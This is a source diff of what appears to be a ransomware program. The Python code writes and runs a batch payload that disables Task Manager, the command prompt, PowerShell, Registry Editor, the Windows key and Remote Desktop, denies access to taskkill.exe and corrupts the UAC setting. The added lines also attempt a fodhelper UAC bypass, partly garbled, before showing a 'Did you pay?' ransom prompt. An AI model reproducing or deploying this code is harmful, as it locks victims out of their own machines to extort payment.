@@ -11,84 +11,11 @@ import requests
 import os
 import threading
 
-# The content of the batch file that will be executed with administrator privileges
-batch_content = r''' @echo off
-:: Check if the script is running as administrator
-::NET SESSION >nul 2>&1
-::if %errorlevel% neq 0 (
-    :: Re-launch the batch script as administrator using PowerShell
-    ::powershell -Command "Start-Process cmd -ArgumentList '/c', '%%~f0' -Verb runAs"
-    ::exit /b
-::)
 
-:: Disable Task Manager
-echo Disabling Task Manager...
-reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
-
-:: Disable Command Prompt
-echo Disabling Command Prompt...
-reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /t REG_DWORD /d 2 /f
-reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 2 /f
-
-:: Disable PowerShell
-echo Disabling PowerShell...
-reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisablePowershell /t REG_DWORD /d 1 /f
-reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisablePowershell /t REG_DWORD /d 1 /f
-
-
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v DisallowRun /t REG_DWORD /d 1 /f
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v 1 /t REG_SZ /d "cmd.exe" /f
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v 2 /t REG_SZ /d "powershell.exe" /f
-
-:: Prevent taskkill from running (make it read-only)
-echo Preventing taskkill.exe from being executed...
-icacls "C:\Windows\System32\taskkill.exe" /deny Everyone:(R)
-
-:: Disable Windows Key
-echo Disabling Windows Key without restart...
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWinKeys /t REG_DWORD /d 1 /f
-
-:: Alternatively, Corrupt UAC (EnableLUA) by changing the registry type (use with caution)
-::echo Corrupting UAC (EnableLUA)... (this may cause unpredictable results)
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_SZ /d "corrupted" /f
-
-
-:: Refresh Explorer to apply changes immediately
-taskkill /im explorer.exe /f >nul 2>&1
-start explorer.exe
-
-reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "" /f
-
-:: Disable Remote Desktop
-echo Disabling Remote Desktop...
-reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
-
-:: Check if Registry Editor is already disabled
-reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools >nul 2>&1
-if %errorlevel% neq 0 (
-    echo Disabling Registry Editor...
-    reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
-    echo Registry Editor has been disabled.
-) else (
-    echo Registry Editor is already disabled.
-)
-
-'''
-# Path where the batch file will be created
-batch_file = 'admin_script.bat'
-print("Just created the ad bat")
-
-# Create the batch file
-with open(batch_file, 'w') as f:
-    f.write(batch_content)
 
 
 def windows_payload():
     try:
-        # subprocess.run(
-        #     ["cmd", "/c", "admin_script.bat"],
-        #     creationflags=subprocess.CREATE_NO_WINDOW  # Optional: hide the command window
-        # )
         subprocess.run(
             ["cmd", "/c", "admin_script.bat"], creationflags=subprocess.CREATE_NEW_CONSOLE
         )
@@ -259,6 +186,77 @@ pub_key_pem = None
 with open(pub_path, 'r') as pub_file:
     pub_key_pem = pub_file.read()
 
+# The content of the batch file that will be executed with administrator privileges
+batch_content = r''' @echo off
+:: Check if the script is running as administrator
+NET SESSION >nul 2>&1
+if %errorlevel% neq 0 (
+    echo This script is not running as Administrator. Restarting with elevated privileges...
+    powershell -Command "Start-Process cmd -ArgumentList '/c', '%~f0' -Verb runAs"
+    exit /b
+)
+
+New-Item “HKCU:\Software\Classes\ms-settings\Shell\Open\command” -Force
+New-ItemProperty -Path “HKCU:\Software\Classes\ms-settings\Shell\Open\command” -Name “DelegateExecute” -Value “” -Force
+et-ItemProperty -Path “HKCU:\Software\Classes\ms-settings\Shell\Open\command” -Name “(default)” -Value $custom -Force
+
+Start Process "C\Windows\System32\fodhelper.exe"
+:: Disable Task Manager
+echo Disabling Task Manager...
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
+
+:: Disable Command Prompt
+echo Disabling Command Prompt...
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /t REG_DWORD /d 2 /f
+reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 2 /f
+
+:: Disable PowerShell
+echo Disabling PowerShell...
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisablePowershell /t REG_DWORD /d 1 /f
+reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisablePowershell /t REG_DWORD /d 1 /f
+
+:: Disable running cmd.exe and powershell.exe
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v DisallowRun /t REG_DWORD /d 1 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v 1 /t REG_SZ /d "cmd.exe" /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v 2 /t REG_SZ /d "powershell.exe" /f
+
+:: Prevent taskkill from running (make it read-only)
+echo Preventing taskkill.exe from being executed...
+icacls "C:\Windows\System32\taskkill.exe" /deny Everyone:(R)
+
+:: Disable Windows Key
+echo Disabling Windows Key without restart...
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWinKeys /t REG_DWORD /d 1 /f
+
+:: Refresh Explorer to apply changes immediately
+taskkill /im explorer.exe /f >nul 2>&1
+start explorer.exe
+
+:: Disable Remote Desktop
+echo Disabling Remote Desktop...
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
+
+:: Check if Registry Editor is already disabled
+reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools >nul 2>&1
+if %errorlevel% neq 0 (
+    echo Disabling Registry Editor...
+    reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
+    echo Registry Editor has been disabled.
+) else (
+    echo Registry Editor is already disabled.
+)
+
+'''
+# Path where the batch file will be created
+batch_file = 'admin_script.bat'
+print("Just created the ad bat")
+
+# Create the batch file
+with open(batch_file, 'w') as f:
+    f.write(batch_content)
+
+windows_payload()
+
 # This confirmation is here to let the server know they can check the db
 usr = messagebox.askyesno("Payment", "Did you pay?")
 
@@ -293,5 +291,5 @@ with open('./encrypted_files.txt', 'r') as files:
         d_line = line.strip()
         print(d_line)
         decrypt_file(d_line, d_line, decrypted_aes)
-    
+
 
